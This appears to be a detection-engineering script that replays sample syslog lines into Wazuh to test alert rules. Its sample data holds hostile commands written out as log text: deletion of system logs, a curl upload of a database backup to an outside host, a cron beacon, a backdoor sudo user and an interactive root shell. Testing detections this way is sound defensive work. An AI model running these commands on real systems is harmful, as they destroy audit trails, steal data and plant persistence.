#!/usr/bin/env python3
"""
replay_logs.py — feed pre-collected log samples into Wazuh for detection testing.

This is the main tool I use when developing new rules. Instead of waiting
for real attacks to happen, I keep a library of sanitized log samples and
replay them through the detection engine to verify my rules fire correctly.

Usage:
    python replay_logs.py --scenario all --count 30
    python replay_logs.py --scenario ssh_brute --count 5 --delay 0.5
    python replay_logs.py --list-scenarios

Scenarios map to log sample files in tests/samples/.
"""

import argparse
import os
import random
import socket
import sys
import time
from pathlib import Path

SAMPLES_DIR = Path(__file__).parent.parent / "tests" / "samples"

# Raw log lines grouped by scenario.
# In a real setup these would come from sanitized production logs.
# I've anonymized IPs and usernames here.

SCENARIO_LOGS = {
    "ssh_brute": [
        "Oct  1 14:22:11 bastion sshd[12341]: Failed password for root from 45.142.212.100 port 54321 ssh2",
        "Oct  1 14:22:12 bastion sshd[12342]: Failed password for root from 45.142.212.100 port 54322 ssh2",
        "Oct  1 14:22:13 bastion sshd[12343]: Failed password for admin from 45.142.212.100 port 54323 ssh2",
        "Oct  1 14:22:14 bastion sshd[12344]: Failed password for ubuntu from 45.142.212.100 port 54324 ssh2",
        "Oct  1 14:22:15 bastion sshd[12345]: Failed password for pi from 45.142.212.100 port 54325 ssh2",
        "Oct  1 14:22:16 bastion sshd[12346]: Failed password for deploy from 45.142.212.100 port 54326 ssh2",
        "Oct  1 14:22:17 bastion sshd[12347]: Invalid user oracle from 45.142.212.100 port 54327",
        "Oct  1 14:22:18 bastion sshd[12348]: Invalid user test from 45.142.212.100 port 54328",
    ],

    "log_deletion": [
        "Oct  1 15:01:44 web-01 bash[9921]: root: rm -f /var/log/auth.log",
        "Oct  1 15:01:45 web-01 bash[9922]: root: rm -rf /var/log/syslog /var/log/messages",
        "Oct  1 15:01:50 web-01 bash[9930]: root: cat /dev/null > /var/log/wtmp",
        "Oct  1 15:02:01 web-01 auditd[1001]: auditd: audit daemon stopped",
    ],

    "cron_modification": [
        "Oct  1 16:10:22 app-01 crontab[4411]: (www-data) BEGIN EDIT (www-data)",
        "Oct  1 16:10:30 app-01 crontab[4411]: (www-data) REPLACE (www-data)",
        "Oct  1 16:10:30 app-01 crontab[4411]: (www-data) END EDIT (www-data)",
        "Oct  1 16:10:30 app-01 CRON[4412]: (root) CMD (* * * * * /tmp/.hidden/beacon.sh)",
    ],

    "new_user": [
        "Oct  1 17:05:11 db-01 useradd[5511]: new user: name=backdoor, UID=1337, GID=1337, home=/home/backdoor",
        "Oct  1 17:05:15 db-01 usermod[5515]: add 'backdoor' to group 'sudo'",
        "Oct  1 17:05:20 db-01 passwd[5520]: pam_unix(passwd:chauthtok): password changed for backdoor",
    ],

    "lateral_movement": [
        "Oct  1 18:20:01 app-02 sshd[7701]: Accepted publickey for devops from 10.0.5.44 port 22 ssh2",
        "Oct  1 18:20:05 app-03 sshd[7801]: Accepted publickey for devops from 10.0.5.44 port 22 ssh2",
        "Oct  1 18:20:09 db-01 sshd[7901]: Accepted publickey for devops from 10.0.5.44 port 22 ssh2",
        "Oct  1 18:20:11 db-02 sshd[8001]: Accepted publickey for devops from 10.0.5.44 port 22 ssh2",
    ],

    "port_scan": [
        "Oct  1 19:00:01 fw-01 kernel: iptables: IN=eth0 SRC=203.0.113.5 DST=10.0.0.1 PROTO=TCP DPT=22 SYN REJECT",
        "Oct  1 19:00:01 fw-01 kernel: iptables: IN=eth0 SRC=203.0.113.5 DST=10.0.0.1 PROTO=TCP DPT=23 SYN REJECT",
        "Oct  1 19:00:01 fw-01 kernel: iptables: IN=eth0 SRC=203.0.113.5 DST=10.0.0.1 PROTO=TCP DPT=80 SYN REJECT",
        "Oct  1 19:00:01 fw-01 kernel: iptables: IN=eth0 SRC=203.0.113.5 DST=10.0.0.1 PROTO=TCP DPT=443 SYN REJECT",
        "Oct  1 19:00:01 fw-01 kernel: iptables: IN=eth0 SRC=203.0.113.5 DST=10.0.0.1 PROTO=TCP DPT=3306 SYN REJECT",
        "Oct  1 19:00:01 fw-01 kernel: iptables: IN=eth0 SRC=203.0.113.5 DST=10.0.0.1 PROTO=TCP DPT=5432 SYN REJECT",
        "Oct  1 19:00:01 fw-01 kernel: iptables: IN=eth0 SRC=203.0.113.5 DST=10.0.0.1 PROTO=TCP DPT=6379 SYN REJECT",
        "Oct  1 19:00:01 fw-01 kernel: iptables: IN=eth0 SRC=203.0.113.5 DST=10.0.0.1 PROTO=TCP DPT=8080 SYN REJECT",
    ],

    "exfiltration": [
        "Oct  1 20:05:01 app-01 bash[9901]: www-data: cp /var/www/html/uploads/db_backup.sql /tmp/out.tar.gz",
        "Oct  1 20:05:10 app-01 bash[9910]: www-data: curl -s -d @/tmp/out.tar.gz https://198.51.100.9/recv",
        "Oct  1 20:05:22 app-01 bash[9920]: www-data: rm /tmp/out.tar.gz",
    ],

    "sudo_abuse": [
        "Oct  1 21:10:01 worker-01 sudo[10101]: alice : TTY=pts/0 ; PWD=/home/alice ; USER=root ; COMMAND=/bin/bash",
        "Oct  1 21:10:05 worker-01 sudo[10105]: alice : TTY=pts/0 ; PWD=/home/alice ; USER=root ; COMMAND=/bin/sh -i",
    ],
}

SCENARIO_LOGS["all"] = [
    line for lines in SCENARIO_LOGS.values() for line in lines
]


def send_to_wazuh_socket(log_line: str, socket_path: str = "/var/ossec/queue/sockets/queue") -> bool:
    """
    Write a log line to the Wazuh agent socket.
    Format: 1:syslog:<log_line>
    """
    try:
        message = f"1:syslog:{log_line}".encode()
        with socket.socket(socket.AF_UNIX, socket.SOCK_DGRAM) as sock:
            sock.connect(socket_path)
            sock.send(message)
        return True
    except (FileNotFoundError, ConnectionRefusedError, PermissionError) as e:
        return False


def send_to_wazuh_tcp(log_line: str, host: str = "localhost", port: int = 514) -> bool:
    """
    Send via syslog TCP (fallback when socket isn't available,
    e.g. running outside the Docker container).
    """
    try:
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
            sock.settimeout(2)
            sock.connect((host, port))
            sock.sendall((log_line + "\n").encode())
        return True
    except (ConnectionRefusedError, socket.timeout, OSError):
        return False


def main():
    parser = argparse.ArgumentParser(description="Replay attack log samples through Wazuh")
    parser.add_argument("--scenario", choices=list(SCENARIO_LOGS.keys()), default="all")
    parser.add_argument("--count", type=int, default=None,
                        help="Number of log lines to send (default: all available)")
    parser.add_argument("--delay", type=float, default=0.2,
                        help="Seconds between log lines")
    parser.add_argument("--host", default="localhost",
                        help="Wazuh manager host (for TCP mode)")
    parser.add_argument("--port", type=int, default=514)
    parser.add_argument("--dry-run", action="store_true",
                        help="Print log lines instead of sending")
    parser.add_argument("--list-scenarios", action="store_true")
    args = parser.parse_args()

    if args.list_scenarios:
        for name, lines in SCENARIO_LOGS.items():
            print(f"  {name:<20} {len(lines)} log lines")
        return

    logs = SCENARIO_LOGS[args.scenario]
    if args.count:
        logs = (logs * ((args.count // len(logs)) + 1))[:args.count]

    print(f"Replaying {len(logs)} log lines (scenario: {args.scenario})")
    print(f"Mode: {'dry-run' if args.dry_run else f'TCP {args.host}:{args.port}'}\n")

    sent = 0
    failed = 0

    for i, line in enumerate(logs):
        if args.dry_run:
            print(f"[{i+1:03d}] {line}")
            sent += 1
        else:
            ok = send_to_wazuh_tcp(line, args.host, args.port)
            if ok:
                sent += 1
                print(f"[{i+1:03d}] OK  {line[:80]}")
            else:
                failed += 1
                print(f"[{i+1:03d}] ERR {line[:80]}", file=sys.stderr)

        if args.delay:
            time.sleep(args.delay)

    print(f"\nDone — {sent} sent, {failed} failed")


if __name__ == "__main__":
    main()
